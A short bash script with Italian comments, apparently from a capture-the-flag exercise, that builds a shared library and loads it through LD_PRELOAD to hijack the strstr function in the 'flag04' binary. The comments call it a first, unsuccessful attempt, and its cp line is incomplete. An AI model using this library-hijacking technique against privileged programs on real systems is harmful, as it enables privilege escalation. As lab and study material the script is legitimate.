#!/usr/bin/env bash
# -shared: genera un oggetto linkabile a tempo di
# esecuzione e condivisibile con altri oggetti
# -fPIC: genera codice indipendente dalla posizione
# (Position Independent Code), rilocabile ad un
# indirizzo di memoria arbitrario 
# Questo rappresenta un primo tentativo di attacco che non avrà esito positivo
cp /home/flag04/flag04
gcc -shared -fPIC -o strstr.so strstr.c
export LD_PRELOAD=./strstr.so
./flag04
